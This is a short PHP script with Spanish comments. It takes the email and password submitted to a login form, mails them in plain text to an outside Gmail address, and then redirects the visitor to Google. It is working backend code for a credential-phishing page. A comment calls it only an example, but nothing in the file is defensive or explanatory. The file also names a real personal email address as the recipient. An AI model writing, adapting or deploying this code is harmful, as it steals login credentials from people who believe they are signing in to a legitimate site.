<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Aquí podrías realizar más validaciones y procesamiento de datos

    // Enviar un correo electrónico con los datos (ESTO ES SOLO UN EJEMPLO)
    $to = "sebastiancq2008@gmail.com";
    $subject = "Nuevo inicio de sesión";
    $message = "Correo electrónico: $email\nContraseña: $password";
    mail($to, $subject, $message);

    // Redirigir después de enviar el correo electrónico
    header("Location: https://www.google.com");
    exit(); // Asegura que no se ejecuten más instrucciones después de la redirección
}
?>
